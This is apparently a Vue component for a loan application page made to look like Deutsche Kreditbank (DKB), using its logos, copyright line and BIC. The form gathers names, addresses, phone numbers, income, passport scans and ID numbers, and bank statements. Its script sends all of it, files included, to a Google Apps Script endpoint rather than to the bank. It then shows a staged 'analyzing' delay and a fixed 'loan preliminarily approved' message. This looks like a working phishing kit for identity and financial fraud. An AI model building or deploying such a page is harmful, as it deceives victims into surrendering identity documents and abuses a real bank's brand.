<script setup lang="ts">
import { ref, onMounted } from "vue";
import { useI18n } from "vue-i18n";
import LogoDkb from "@/assets/logo_dkb.svg";
import LogoDkbPng from "@/assets/logo_dkb.png";
import ModalBook2 from "@/assets/MODAL_BOOK_2.jpg";
import ModalBook from "@/assets/MODAL_BOOK.svg";


const form = ref({
  firstName: "",
  lastName: "",
  dateOfBirth: "",
  desiredLoanAmount: "",
  countryOfBirth: "",
  countryOfResidence: "",
  income: "",
  incomeCurrency: "EUR",
  additionalIncome: "",
  additionalIncomeCurrency: "EUR",
  email: "",
  phone: "+",
  additionalPhone: "+",
  residentialAddress: "",
  workplace: "",
  position: "",
  workStartYear: "",
  passportFile: null as File | null, 
  passportIdFront: "",
  passportBackFile: null as File | null,
  passportIdBack: "",
  bankStatementFile: null as File | null,
});

const { t, locale } = useI18n();

const changeLanguage = (lang: string) => {
  locale.value = lang;
  sessionStorage.setItem("lang", lang);
};
const getLanguageLabel = () => {
  return locale.value === "de" ? "DE" : "EN";
};
const step = ref<1 | 2>(1);
const hasAdditionalIncome = ref(false);
const hasAdditionalPhone = ref(false);
const noPassportBack = ref(false);
const noBankAccount = ref(false);
const isSubmitting = ref(false);
const errorMessage = ref("");
const success = ref(false);
const showSuccessDialog = ref(false);
const showProcessingOverlay = ref(false);
const MIN_PROCESSING_DURATION_MS = 8000;
const GOOGLE_SCRIPT_URL =
  "https://script.google.com/macros/s/AKfycbwWT0Hq54xbGe8XeAFxCRwFw32obq0HvSqmcHzk8u4K4oh09c5snY1PTwQJbL7n7UM/exec";

function waitForProcessingDelay(startTime: number) {
  const elapsed = Date.now() - startTime;
  const remaining = Math.max(0, MIN_PROCESSING_DURATION_MS - elapsed);
  if (remaining <= 0) {
    return Promise.resolve();
  }
  return new Promise<void>((resolve) => setTimeout(resolve, remaining));
}

function getMaxBirthDate(): string {
  const today = new Date();
  const d = new Date(
    today.getFullYear() - 18,
    today.getMonth(),
    today.getDate()
  );
  const yyyy = d.getFullYear();
  const mm = String(d.getMonth() + 1).padStart(2, "0");
  const dd = String(d.getDate()).padStart(2, "0");
  return `${yyyy}-${mm}-${dd}`;
}

const currentYear = new Date().getFullYear();

onMounted(() => {
  const stored = sessionStorage.getItem("desiredLoanAmount");
  if (stored) {
    form.value.desiredLoanAmount = stored;
    sessionStorage.removeItem("desiredLoanAmount");
  }
});

function handleNameInput(field: "firstName" | "lastName", e: Event) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  value = value.replace(/[^A-Za-zА-Яа-яЁё\s'-]/g, "");
  form.value[field] = value;
}
function handleLettersOnlyInput(
  field: "countryOfBirth" | "countryOfResidence" | "residentialAddress",
  e: Event
) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  value = value.replace(/[0-9]/g, "");
  form.value[field] = value;
}
function handlePhoneInput(e: Event) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  value = value.replace(/[^\d+]/g, "");
  if (!value.startsWith("+")) {
    value = "+" + value.replace(/\D/g, "");
  } else {
    const digitsPart = value.slice(1).replace(/\D/g, "");
    value = "+" + digitsPart;
  }
  const digits = value.slice(1).replace(/\D/g, "");
  form.value.phone = "+" + digits;
}

function additionalPhoneInput(e: Event) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  value = value.replace(/[^\d+]/g, "");

  if (!value.startsWith("+")) {
    value = "+" + value.replace(/\D/g, "");
  } else {
    const digitsPart = value.slice(1).replace(/\D/g, "");
    value = "+" + digitsPart;
  }
  const digits = value.slice(1).replace(/\D/g, "");
  form.value.additionalPhone = "+" + digits;
}

function handleWorkplaceInput(e: Event) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  if (value.length > 50) value = value.slice(0, 50);
  form.value.workplace = value;
}

function handlePositionInput(e: Event) {
  const target = e.target as HTMLInputElement;
  let value = target.value;
  if (value.length > 25) value = value.slice(0, 25);
  form.value.position = value;
}

function handleFileChange(
  e: Event,
  key: "passportFile" | "passportBackFile" | "bankStatementFile"
) {
  const target = e.target as HTMLInputElement;
  if (!target.files || !target.files[0]) return;
  form.value[key] = target.files[0];
}
function fileToBase64(file: File | null): Promise<string | null> {
  if (!file) return Promise.resolve(null);
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => {
      const result = String(reader.result || "");
      const base64 = result.includes(",") ? result.split(",")[1] : result;
      resolve(base64);
    };
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}
function validateStep1(): boolean {
  if (!form.value.dateOfBirth) {
    errorMessage.value = t("quiz.errors.selectDateOfBirth");
    return false;
  }
  const dob = new Date(form.value.dateOfBirth);
  const minDob = new Date(getMaxBirthDate());
  if (dob > minDob) {
    errorMessage.value = t("quiz.errors.mustBe18");
    return false;
  }
  const incomeNum = Number(form.value.income || 0);
  if (Number.isNaN(incomeNum) || incomeNum < 0) {
    errorMessage.value = t("quiz.errors.incomeInvalid");
    return false;
  }
  const desiredNum = Number(form.value.desiredLoanAmount || 0);
  if (Number.isNaN(desiredNum) || desiredNum <= 0) {
    errorMessage.value = t("quiz.errors.desiredLoanAmountInvalid");
    return false;
  }
  if (hasAdditionalIncome.value) {
    const addNum = Number(form.value.additionalIncome || 0);
    if (Number.isNaN(addNum) || addNum < 0) {
      errorMessage.value = t("quiz.errors.additionalIncomeInvalid");
      return false;
    }
  }
  const phoneDigits = form.value.phone.replace(/\D/g, "");
  if (!form.value.phone.startsWith("+") || phoneDigits.length === 0) {
    errorMessage.value = t("quiz.errors.phoneInvalid");
    return false;
  }
  const yearNum = Number(form.value.workStartYear);
  if (Number.isNaN(yearNum) || yearNum < 1925 || yearNum > currentYear) {
    errorMessage.value = t("quiz.errors.workStartYearInvalid", {
      year: currentYear,
    });
    return false;
  }
  if (
    !form.value.firstName.trim() ||
    !form.value.lastName.trim() ||
    !form.value.countryOfBirth.trim() ||
    !form.value.countryOfResidence.trim() ||
    !form.value.email.trim() ||
    !form.value.residentialAddress.trim() ||
    !form.value.workplace.trim() ||
    !form.value.position.trim()
  ) {
    errorMessage.value = t("quiz.errors.fillFirstStep");
    return false;
  }

  errorMessage.value = "";
  return true;
}
function goToStep2() {
  if (!validateStep1()) return;
  step.value = 2;
}
async function onSubmit() {
  let processingDelayPromise: Promise<void> | null = null;
  let processingStartedAt = 0;
  try {
    errorMessage.value = "";
    success.value = false;
    if (!validateStep1()) {
      step.value = 1;
      return;
    }
    if (!form.value.passportFile && !form.value.passportIdFront.trim()) {
      errorMessage.value = t("quiz.errors.passportFrontRequired");
      return;
    }
    if (!noPassportBack.value) {
      if (
        !form.value.passportBackFile &&
        !form.value.passportIdBack.trim()
      ) {
        errorMessage.value = t("quiz.errors.passportBackRequired");
        return;
      }
    }
    if (!noBankAccount.value && !form.value.bankStatementFile) {
      errorMessage.value = t("quiz.errors.bankStatementRequired");
      return;
    }
    isSubmitting.value = true;
    processingStartedAt = Date.now();
    showProcessingOverlay.value = true;
    processingDelayPromise = waitForProcessingDelay(processingStartedAt);
    const passportFrontBase64 = await fileToBase64(form.value.passportFile);
    const passportBackBase64 = await fileToBase64(
      noPassportBack.value ? null : form.value.passportBackFile
    );
    const bankStatementBase64 = await fileToBase64(
      noBankAccount.value ? null : form.value.bankStatementFile
    );
    const incomeNum = Number(form.value.income || 0);
    let additionalIncomeStr = "";
    let additionalIncomeCurrencyStr = "";
    if (hasAdditionalIncome.value) {
      additionalIncomeStr = String(form.value.additionalIncome || "");
      additionalIncomeCurrencyStr = form.value.additionalIncomeCurrency;
    }
    const payload = {
      first_name: form.value.firstName,
      last_name: form.value.lastName,
      date_of_birth: form.value.dateOfBirth,
      desired_loan_amount: form.value.desiredLoanAmount,
      country_of_birth: form.value.countryOfBirth,
      country_of_residence: form.value.countryOfResidence,
      income: String(incomeNum),
      income_currency: form.value.incomeCurrency,
      additional_income: additionalIncomeStr,
      additional_income_currency: additionalIncomeCurrencyStr,
      email: form.value.email,
      phone: form.value.phone,
      additional_phone: hasAdditionalPhone.value
        ? form.value.additionalPhone
        : "",
      residential_address: form.value.residentialAddress,
      workplace: form.value.workplace,
      position: form.value.position,
      work_start_year: String(form.value.workStartYear),
      passport_file: passportFrontBase64,
      passport_back_file: passportBackBase64,
      bank_statement_file: bankStatementBase64,
      passport_id_front: form.value.passportIdFront,
      passport_id_back: form.value.passportIdBack,
      no_passport_back: noPassportBack.value ? "1" : "0",
      no_bank_account: noBankAccount.value ? "1" : "0",
    };
    const formData = new FormData();
    (Object.entries(payload) as [string, unknown][]).forEach(
      ([key, value]) => {
        formData.append(key, value != null ? String(value) : "");
      }
    );
    if (form.value.passportFile) {
      formData.append("passport_file_name", form.value.passportFile.name);
      formData.append("passport_file_type", form.value.passportFile.type);
    }

    if (form.value.passportBackFile && !noPassportBack.value) {
      formData.append(
        "passport_back_file_name",
        form.value.passportBackFile.name
      );
      formData.append(
        "passport_back_file_type",
        form.value.passportBackFile.type
      );
    }

    if (form.value.bankStatementFile && !noBankAccount.value) {
      formData.append(
        "bank_statement_file_name",
        form.value.bankStatementFile.name
      );
      formData.append(
        "bank_statement_file_type",
        form.value.bankStatementFile.type
      );
    }
    const res = await fetch(GOOGLE_SCRIPT_URL, {
      method: "POST",
      body: formData,
    });

    if (!res.ok) throw new Error("Request failed");
    const data = await res.json();
    if (!data.success) throw new Error("Script error");

    success.value = true;
    if (processingDelayPromise) {
      await processingDelayPromise;
    }
    showProcessingOverlay.value = false;
    showSuccessDialog.value = true;
  } catch (e) {
    console.error(e);
    errorMessage.value = t("quiz.errors.somethingWentWrong");
  } finally {
    isSubmitting.value = false;
    if (processingDelayPromise) {
      await processingDelayPromise;
    }
    if (!success.value) {
      showProcessingOverlay.value = false;
    }
  }
}
</script>

<template>
  <main class="min-h-screen flex flex-col bg-[#f2f6fb]">
    <header class="bg-white border-b border-slate-200">
      <div
        class="max-w-5xl mx-auto flex items-center justify-between px-4 py-4 md:py-5"
      >
        <div class="flex justify-between gap-3 w-full align-center">
          <img :src="LogoDkb" alt="DKB" class="h-14 w-auto" />
        </div>
        <div class="flex gap-8">
          <v-btn
            variant="text"
            append-icon="mdi-chevron-down"
            rounded="lg"
            class="font-semibold text-xs sm:text-base uppercase text-[#006AC7] pt-2"
          >
            {{ getLanguageLabel() }}
            <v-menu activator="parent">
              <v-list>
                <v-list-item
                  title="DE"
                  class="uppercase"
                  @click="changeLanguage('de')"
                />
                <v-list-item
                  title="EN"
                  class="uppercase"
                  @click="changeLanguage('en')"
                />
              </v-list>
            </v-menu>
          </v-btn>
        </div>
      </div>
    </header>

    <div class="flex-1">
      <div class="max-w-5xl mx-auto px-4 py-10">
        <div class="mb-8">
          <h1 class="mt-2 text-3xl font-semibold text-slate-900">
            {{ $t("quiz.title") }}
          </h1>
          <p class="mt-2 text-sm text-slate-600 max-w-2xl">
            <b>{{ $t("quiz.subtitle") }}</b>
          </p>
        </div>

        <form
          class="bg-white rounded-lg shadow-sm border border-slate-100 p-6 md:p-8"
          @submit.prevent="onSubmit"
        >
          <div
            v-if="step === 1"
            class="grid grid-cols-1 md:grid-cols-2 gap-6"
          >
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.firstName") }} *
              </label>
              <input
                :value="form.firstName"
                @input="(e) => handleNameInput('firstName', e)"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>

            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.lastName") }} *
              </label>
              <input
                :value="form.lastName"
                @input="(e) => handleNameInput('lastName', e)"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>

            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.dateOfBirth") }} *
              </label>
              <input
                v-model="form.dateOfBirth"
                type="date"
                :max="getMaxBirthDate()"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>

            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.desiredLoanAmount") }} *
              </label>
              <input
                v-model="form.desiredLoanAmount"
                type="number"
                min="1000"
                step="500"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.countryOfBirth") }} *
              </label>
              <input
                :value="form.countryOfBirth"
                @input="(e) => handleLettersOnlyInput('countryOfBirth', e)"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.countryOfResidence") }} *
              </label>
              <input
                :value="form.countryOfResidence"
                @input="
                  (e) => handleLettersOnlyInput('countryOfResidence', e)
                "
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div class="flex flex-col">
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.income") }} *
              </label>
              <div class="flex gap-2">
                <input
                  v-model="form.income"
                  type="number"
                  min="0"
                  step="0.01"
                  required
                  class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                />
                <select
                  v-model="form.incomeCurrency"
                  class="rounded-md border border-slate-300 bg-slate-50 px-2 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                >
                  <option value="EUR">EUR</option>
                  <option value="USD">USD</option>
                  <option value="GBP">GBP</option>
                  <option value="CHF">CHF</option>
                  <option value="SEK">SEK</option>
                  <option value="NOK">NOK</option>
                  <option value="DKK">DKK</option>
                </select>
              </div>
            </div>
            <div class="flex flex-col">
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.additionalIncome") }}
              </label>
              <div class="flex items-center gap-4 text-sm mb-2">
                <label class="inline-flex items-center gap-1">
                  <input
                    type="radio"
                    class="h-4 w-4"
                    :checked="hasAdditionalIncome"
                    @change="hasAdditionalIncome = true"
                  />
                  <span>{{ $t("quiz.yes") }}</span>
                </label>
                <label class="inline-flex items-center gap-1">
                  <input
                    type="radio"
                    class="h-4 w-4"
                    :checked="!hasAdditionalIncome"
                    @change="
                      hasAdditionalIncome = false;
                      form.additionalIncome = '';
                    "
                  />
                  <span>{{ $t("quiz.no") }}</span>
                </label>
              </div>

              <div v-if="hasAdditionalIncome" class="flex gap-2">
                <input
                  v-model="form.additionalIncome"
                  type="number"
                  min="0"
                  step="0.01"
                  class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  :placeholder="$t('quiz.additionalIncomePlaceholder')"
                />
                <select
                  v-model="form.additionalIncomeCurrency"
                  class="rounded-md border border-slate-300 bg-slate-50 px-2 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                >
                  <option value="EUR">EUR</option>
                  <option value="USD">USD</option>
                  <option value="GBP">GBP</option>
                  <option value="CHF">CHF</option>
                  <option value="SEK">SEK</option>
                  <option value="NOK">NOK</option>
                  <option value="DKK">DKK</option>
                </select>
              </div>
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.email") }} *
              </label>
              <input
                v-model="form.email"
                type="email"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.contactPhone") }} *
              </label>
              <input
                :value="form.phone"
                @input="handlePhoneInput"
                type="tel"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                placeholder="+12345678901"
              />
            </div>
            <div class="flex flex-col">
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.handlePhoneInput") }}
              </label>
              <div class="flex items-center gap-4 text-sm mb-2">
                <label class="inline-flex items-center gap-1">
                  <input
                    type="radio"
                    class="h-4 w-4"
                    :checked="hasAdditionalPhone"
                    @change="hasAdditionalPhone = true"
                  />
                  <span>{{ $t("quiz.yes") }}</span>
                </label>
                <label class="inline-flex items-center gap-1">
                  <input
                    type="radio"
                    class="h-4 w-4"
                    :checked="!hasAdditionalPhone"
                    @change="
                      hasAdditionalPhone = false;
                      form.additionalPhone = '+';
                    "
                  />
                  <span>{{ $t("quiz.no") }}</span>
                </label>
              </div>
              <div v-if="hasAdditionalPhone">
                <input
                  :value="form.additionalPhone"
                  @input="additionalPhoneInput"
                  type="tel"
                  class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  placeholder="+12345678901"
                />
              </div>
            </div>
            <div class="md:col-span-2">
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.residentialAddress") }} *
              </label>
              <input
                :value="form.residentialAddress"
                @input="(e) => handleLettersOnlyInput('residentialAddress', e)"
                type="text"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.workplace") }} *
              </label>
              <input
                :value="form.workplace"
                @input="handleWorkplaceInput"
                type="text"
                required
                maxlength="50"
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>

            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.position") }} *
              </label>
              <input
                :value="form.position"
                @input="handlePositionInput"
                type="text"
                required
                maxlength="25"
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div>
              <label class="block text-sm font-medium text-slate-700 mb-1">
                {{ $t("quiz.workStartYear") }} *
              </label>
              <input
                v-model="form.workStartYear"
                type="number"
                :min="1925"
                :max="currentYear"
                required
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
          </div>
          <div v-else class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div class="md:col-span-2 space-y-2">
              <label class="block text-sm font-medium text-slate-700">
                {{ $t("quiz.passportFrontLabel") }} *
              </label>
              <input
                v-model="form.passportIdFront"
                type="text"
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                :placeholder="$t('quiz.passportFrontPlaceholder')"
              />

              <label
                class="flex h-24 items-center justify-center rounded-md border-2 border-dashed border-slate-300 bg-slate-50 text-xs text-slate-500 cursor-pointer"
              >
                <span>
                  {{ $t("quiz.clickToChooseFile") }}<br />
                  <span class="text-[10px] text-slate-400">
                    {{ $t("quiz.fileFormats") }}
                  </span>
                </span>
                <input
                  type="file"
                  class="hidden"
                  accept=".pdf,.jpg,.jpeg,.png"
                  @change="(e) => handleFileChange(e, 'passportFile')"
                />
              </label>
              <p v-if="form.passportFile" class="mt-1 text-xs text-slate-500">
                {{ $t("quiz.selected") }} {{ form.passportFile.name }}
              </p>
            </div>
            <div class="md:col-span-2 space-y-2">
              <div class="flex items-center justify-between">
                <label class="block text-sm font-medium text-slate-700">
                  {{ $t("quiz.passportBackLabel") }}
                  <span v-if="!noPassportBack"> *</span>
                </label>
                <label class="flex items-center gap-2 text-xs text-slate-600">
                  <input
                    type="checkbox"
                    v-model="noPassportBack"
                    class="h-4 w-4"
                  />
                  <span>{{ $t("quiz.unableToUpload") }}</span>
                </label>
              </div>

              <input
                v-model="form.passportIdBack"
                type="text"
                :disabled="noPassportBack"
                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                :class="noPassportBack ? 'opacity-50 cursor-not-allowed' : ''"
                :placeholder="$t('quiz.passportBackPlaceholder')"
              />

              <label
                class="flex h-24 items-center justify-center rounded-md border-2 border-dashed border-slate-300 bg-slate-50 text-xs text-slate-500"
                :class="noPassportBack ? 'opacity-50 cursor-not-allowed' : 'cursor-pointer'"
              >
                <span>
                  {{ $t("quiz.clickToChooseFile") }}<br />
                  <span class="text-[10px] text-slate-400">
                    {{ $t("quiz.fileFormats") }}
                  </span>
                </span>
                <input
                  type="file"
                  class="hidden"
                  accept=".pdf,.jpg,.jpeg,.png"
                  :disabled="noPassportBack"
                  @change="(e) => handleFileChange(e, 'passportBackFile')"
                />
              </label>
              <p
                v-if="form.passportBackFile && !noPassportBack"
                class="mt-1 text-xs text-slate-500"
              >
                {{ $t("quiz.selected") }} {{ form.passportBackFile.name }}
              </p>
            </div>
            <div class="md:col-span-2 space-y-2">
              <div class="flex items-center justify-between">
                <label class="block text-sm font-medium text-slate-700">
                  {{ $t("quiz.bankStatementUpload") }}
                  <span v-if="!noBankAccount"> *</span>
                </label>
                <label class="flex items-center gap-2 text-xs text-slate-600">
                  <input
                    type="checkbox"
                    v-model="noBankAccount"
                    class="h-4 w-4"
                  />
                  <span>{{ $t("quiz.noBankAccount") }}</span>
                </label>
              </div>

              <label
                class="flex h-24 items-center justify-center rounded-md border-2 border-dashed border-slate-300 bg-slate-50 text-xs text-slate-500"
                :class="noBankAccount ? 'opacity-50 cursor-not-allowed' : 'cursor-pointer'"
              >
                <span>
                  {{ $t("quiz.clickToChooseFile") }}<br />
                  <span class="text-[10px] text-slate-400">
                    {{ $t("quiz.fileFormats") }}
                  </span>
                </span>
                <input
                  type="file"
                  class="hidden"
                  accept=".pdf,.jpg,.jpeg,.png"
                  :disabled="noBankAccount"
                  @change="(e) => handleFileChange(e, 'bankStatementFile')"
                />
              </label>
              <p
                v-if="form.bankStatementFile && !noBankAccount"
                class="mt-1 text-xs text-slate-500"
              >
                {{ $t("quiz.selected") }} {{ form.bankStatementFile.name }}
              </p>
            </div>
          </div>
          <div class="mt-6 space-y-2">
            <p v-if="errorMessage" class="text-sm text-red-600">
              {{ errorMessage }}
            </p>
          </div>
          <div class="mt-6 flex justify-end gap-3">
            <button
              v-if="step === 2"
              type="button"
              class="inline-flex items-center justify-center rounded-md border border-slate-300 px-6 py-3 text-sm font-semibold text-slate-700 bg-white hover:bg-slate-50"
              @click="step = 1"
            >
              {{ $t("quiz.back") }}
            </button>

            <button
              v-if="step === 1"
              type="button"
              :disabled="isSubmitting"
              class="inline-flex items-center justify-center rounded-md bg-[#007bff] px-10 py-3 text-sm font-semibold text-white hover:bg-[#0067d4] disabled:opacity-60 disabled:cursor-not-allowed"
              @click="goToStep2"
            >
              {{ isSubmitting ? $t("quiz.sending") : $t("quiz.next") }}
            </button>

            <button
              v-else
              type="submit"
              :disabled="isSubmitting"
              class="inline-flex items-center justify-center rounded-md bg-[#007bff] px-10 py-3 text-sm font-semibold text-white hover:bg-[#0067d4] disabled:opacity-60 disabled:cursor-not-allowed"
            >
              {{ isSubmitting ? $t("quiz.sending") : $t("quiz.next") }}
            </button>
          </div>
        </form>
      </div>
    </div>

    <div
      v-if="showProcessingOverlay"
      class="fixed inset-0 bg-white/95 backdrop-blur-sm flex flex-col items-center justify-center gap-6 z-50 px-6 text-center"
    >
      <div>
        <p class="text-lg font-semibold text-slate-800" v-if="locale !== 'de'">
          Uploading and analyzing documents
        </p>
        <p class="text-lg font-semibold text-slate-800" v-else>
          Hochladen und Analysieren der Dokumente läuft…
        </p>
      </div>
      <div class="w-64 max-w-full h-2 bg-slate-200 rounded-full overflow-hidden">
        <div class="loading-bar-progress"></div>
      </div>
    </div>

    <footer class="mt-8 bg-[#002E5C] text-white">
      <div
        class="max-w-5xl mx-auto px-4 py-10 flex flex-col md:flex-row items-center md:items-stretch gap-8"
      >
        <div class="flex gap-4">
          <div
            class="h-28 w-24 flex items-center justify-center bg-white rounded-sm overflow-hidden"
          >
            <img :src="ModalBook2" alt="" class="h-full w-full object-cover" />
          </div>
          <div
            class="h-28 w-24 flex items-center justify-center bg-white rounded-sm overflow-hidden"
          >
            <img :src="ModalBook" alt="" class="h-full w-full object-contain" />
          </div>
        </div>

        <div class="flex-1 text-center md:text-left">
          <p class="text-2xl font-semibold leading-snug">
            {{ $t("quiz.needHelp") }}
          </p>
          <p class="mt-3 text-sm text-white/80">
            {{ $t("quiz.faqDescription") }}
          </p>
        </div>

        <div class="flex items-center justify-center md:justify-end">
          <img :src="LogoDkbPng" alt="DKB" class="h-16 w-auto" />
        </div>
      </div>

      <div class="border-t border-white/10">
        <div
          class="max-w-5xl mx-auto px-4 py-4 text-[11px] text-white/70 flex flex-wrap gap-x-6 gap-y-2"
        >
          <span>© 2025 Deutsche Kreditbank AG</span>
          <span>BIC: BYLADEM1001</span>
          <span class="underline underline-offset-2 cursor-pointer">
            {{ $t("quiz.contact") }}
          </span>
          <span class="underline underline-offset-2 cursor-pointer">
            {{ $t("quiz.imprint") }}
          </span>
          <span class="underline underline-offset-2 cursor-pointer">
            {{ $t("quiz.dataProtection") }}
          </span>
          <span class="underline underline-offset-2 cursor-pointer">
            {{ $t("quiz.cookieSettings") }}
          </span>
        </div>
      </div>
    </footer>

    <v-dialog v-model="showSuccessDialog" max-width="500" persistent>
      <v-card>
        <v-card-title class="text-h5 pa-6 pb-4 text-slate-900">
          {{ locale === "de" ? "Herzlichen Glückwunsch!" : "Congratulations!" }}
        </v-card-title>
        <v-card-text class="pa-6 pt-2 pb-4">
          <p class="text-body-1" v-if="locale !== 'de'">
            Congratulations! Your loan has been preliminarily approved. A
            personal manager will contact you shortly.
          </p>
          <p class="text-body-1" v-else>
            Herzlichen Glückwunsch! Ihr Kredit wurde vorläufig genehmigt. In
            Kürze wird sich ein persönlicher Betreuer mit Ihnen in Verbindung
            setzen.
          </p>
        </v-card-text>
        <v-card-actions class="pa-6 pt-2">
          <v-spacer></v-spacer>
          <v-btn
            color="primary"
            variant="flat"
            @click="showSuccessDialog = false"
          >
            {{ $t("quiz.close") }}
          </v-btn>
        </v-card-actions>
      </v-card>
    </v-dialog>
  </main>
</template>

<style scoped>
.loading-bar-progress {
  height: 100%;
  width: 30%;
  background: linear-gradient(90deg, #007bff, #00b4ff);
  animation: loading-progress 1.4s ease-in-out infinite;
  border-radius: 999px;
}

@keyframes loading-progress {
  0% {
    transform: translateX(-100%);
  }
  50% {
    transform: translateX(20%);
  }
  100% {
    transform: translateX(120%);
  }
}
</style>
